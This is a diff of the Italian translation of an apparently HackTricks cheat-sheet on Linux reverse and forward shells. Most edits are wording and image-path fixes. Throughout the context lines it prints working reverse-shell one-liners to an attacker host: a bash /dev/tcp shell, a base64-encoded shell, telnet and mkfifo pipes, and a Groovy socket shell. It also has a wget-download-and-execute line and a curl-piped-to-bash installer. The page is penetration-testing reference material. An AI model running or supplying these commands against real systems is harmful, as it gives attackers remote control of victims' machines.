@@ -8,15 +8,15 @@ Altri modi per supportare HackTricks:
 
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -41,7 +41,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Shell sicura dei simboli
+### Shell sicuro per simboli
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -54,7 +54,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: Questa parte del comando avvia una shell interattiva (`-i`) di Bash.
 2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia l'output standard** (`stdout`) che **l'errore standard** (`stderr`) allo **stesso destinatario**.
-3. **`/dev/tcp/<INDIRIZZO-IP-ATTACCANTE>/<PORTA>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
+3. **`/dev/tcp/<INDIRIZZO-ATTACCANTE>/<PORTA>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
 * **Reindirizzando i flussi di output e di errore su questo file**, il comando invia efficacemente l'output della sessione della shell interattiva alla macchina dell'attaccante.
 4. **`0>&1`**: Questa parte del comando **reindirizza l'input standard (`stdin`) allo stesso destinatario dell'output standard (`stdout`)**.
 
@@ -63,9 +63,9 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Shell in Avanti
+## Shell Avanti
 
-Quando si tratta di una vulnerabilità di **Esecuzione di Codice Remoto (RCE)** all'interno di un'applicazione web basata su Linux, ottenere una shell inversa potrebbe essere ostacolato dalle difese di rete come le regole iptables o meccanismi di filtraggio dei pacchetti intricati. In tali ambienti limitati, un approccio alternativo prevede l'instaurazione di una shell PTY (Pseudo Terminale) per interagire in modo più efficace con il sistema compromesso.
+Quando si affronta una vulnerabilità di **Esecuzione di Codice Remoto (RCE)** all'interno di un'applicazione web basata su Linux, il raggiungimento di una shell inversa potrebbe essere ostacolato dalle difese di rete come le regole iptables o meccanismi di filtraggio dei pacchetti intricati. In tali ambienti limitati, un approccio alternativo prevede l'instaurazione di una shell PTY (Pseudo Terminale) per interagire in modo più efficace con il sistema compromesso.
 
 Uno strumento consigliato per questo scopo è [toboggan](https://github.com/n3rada/toboggan.git), che semplifica l'interazione con l'ambiente di destinazione.
 
@@ -99,16 +99,15 @@ toboggan -m nix.py -i
 ```
 Per sfruttare direttamente una shell interattiva. È possibile aggiungere `-b` per l'integrazione con Burpsuite e rimuovere `-i` per un wrapper rce più basilare.
 
-
 Un'altra possibilità consiste nell'utilizzare l'implementazione della shell in avanti di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 È sufficiente modificare:
 
-* L'URL dell'host vulnerabile
-* Il prefisso e il suffisso del payload (se presenti)
-* Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
+- L'URL dell'host vulnerabile
+- Il prefisso e il suffisso del payload (se presenti)
+- Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
 
-Quindi, è possibile **inviare comandi** o addirittura **utilizzare il comando `upgrade`** per ottenere una PTY completa (si noti che i tubi vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
+Successivamente, è possibile **inviare comandi** o addirittura **utilizzare il comando `upgrade`** per ottenere una PTY completa (si noti che i tubi vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
 
 ## Netcat
 ```bash
@@ -125,6 +124,8 @@ Controllalo su [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
+
+Telnet è un protocollo di rete che consente di stabilire una connessione remota tramite la linea di comando. Può essere utilizzato per accedere e controllare dispositivi remoti su una rete.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -137,7 +138,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Per inviare il comando, scriverlo, premere Invio e premere CTRL+D (per interrompere STDIN)
+Per inviare il comando, scriverlo, premere invio e premere CTRL+D (per interrompere STDIN)
 
 **Vittima**
 ```bash
@@ -287,8 +288,6 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; s
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
-
-Gawk è un potente linguaggio di programmazione utilizzato per manipolare dati, file di testo e generare report. Viene spesso utilizzato per l'elaborazione di output di comandi e script. Gawk supporta espressioni regolari, array associativi e funzioni personalizzate, rendendolo estremamente flessibile per una varietà di compiti di scripting e analisi dei dati.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -326,7 +325,7 @@ Xnest :1
 ```
 ## Groovy
 
-di [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: Il reverse shell Java funziona anche per Groovy
+di [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: La shell inversa Java funziona anche per Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -342,7 +341,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -356,6 +355,6 @@ Altri modi per supportare HackTricks:
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
